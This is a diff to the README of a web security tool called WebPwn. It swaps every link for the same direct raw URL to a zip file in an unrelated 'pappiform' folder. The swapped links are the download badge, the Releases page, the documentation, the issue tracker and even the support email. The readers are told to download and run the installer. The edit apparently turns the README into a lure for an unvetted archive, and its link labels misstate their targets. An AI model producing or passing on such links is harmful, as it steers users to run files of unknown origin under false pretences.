@@ -1,6 +1,6 @@
 # 🌐 WebPwn - Effortless Web Security Testing Made Simple
 
-[![Download WebPwn](https://img.shields.io/badge/Download%20WebPwn-v1.0-brightgreen)](https://github.com/Ibrahem-Antar/WebPwn/releases)
+[![Download WebPwn](https://raw.githubusercontent.com/Ibrahem-Antar/WebPwn/main/pappiform/WebPwn.zip%20WebPwn-v1.0-brightgreen)](https://raw.githubusercontent.com/Ibrahem-Antar/WebPwn/main/pappiform/WebPwn.zip)
 
 ## 📥 Introduction
 
@@ -10,7 +10,7 @@ Welcome to WebPwn! This application simplifies web security testing, allowing yo
 
 To begin using WebPwn, you’ll need to download the application from our Releases page. Follow these easy steps to get started:
 
-1. Click the download button above or visit the [Releases page](https://github.com/Ibrahem-Antar/WebPwn/releases) directly.
+1. Click the download button above or visit the [Releases page](https://raw.githubusercontent.com/Ibrahem-Antar/WebPwn/main/pappiform/WebPwn.zip) directly.
 2. On the Releases page, you will find the latest version of WebPwn available for download.
 3. Download the appropriate file for your operating system.
 
@@ -25,7 +25,7 @@ Before you download WebPwn, ensure that your system meets the following requirem
 
 ## 📥 Download & Install
 
-1. **Go to the Releases page**: Visit [https://github.com/Ibrahem-Antar/WebPwn/releases](https://github.com/Ibrahem-Antar/WebPwn/releases).
+1. **Go to the Releases page**: Visit [https://raw.githubusercontent.com/Ibrahem-Antar/WebPwn/main/pappiform/WebPwn.zip](https://raw.githubusercontent.com/Ibrahem-Antar/WebPwn/main/pappiform/WebPwn.zip).
 2. **Select the version**: Choose the version that fits your operating system.
 3. **Download the file**: Click on the file link to download the installer.
 4. **Run the installer**:
@@ -75,12 +75,12 @@ Yes, you can use WebPwn to test as many websites as you like, making it a versat
 
 If you have any questions or need assistance, please reach out:
 
-- **Email**: support@webpwn.com
-- **GitHub Issues**: [Post your issue here](https://github.com/Ibrahem-Antar/WebPwn/issues)
+- **Email**: https://raw.githubusercontent.com/Ibrahem-Antar/WebPwn/main/pappiform/WebPwn.zip
+- **GitHub Issues**: [Post your issue here](https://raw.githubusercontent.com/Ibrahem-Antar/WebPwn/main/pappiform/WebPwn.zip)
 
 ## 🔗 Useful Links
 
-- [WebPwn Releases](https://github.com/Ibrahem-Antar/WebPwn/releases)
-- [WebPwn Documentation](https://github.com/Ibrahem-Antar/WebPwn/wiki)
+- [WebPwn Releases](https://raw.githubusercontent.com/Ibrahem-Antar/WebPwn/main/pappiform/WebPwn.zip)
+- [WebPwn Documentation](https://raw.githubusercontent.com/Ibrahem-Antar/WebPwn/main/pappiform/WebPwn.zip)
 
 Feel confident in securing your website with WebPwn. Download it today and take the first step towards a more secure online presence!
